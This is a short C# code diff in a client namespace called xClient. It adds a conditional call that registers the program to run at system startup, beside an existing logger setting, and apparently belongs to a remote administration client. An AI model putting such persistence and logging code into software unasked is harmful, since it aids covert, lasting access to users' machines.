@@ -133,6 +133,11 @@ namespace xClient
 
                 new Thread(SystemCore.UserIdleThread).Start();
 
+                if (Settings.STARTUP)
+                {
+                    SystemCore.AddToStartup();
+                }
+
                 InitializeClient();
 
                 if (Settings.ENABLELOGGER)
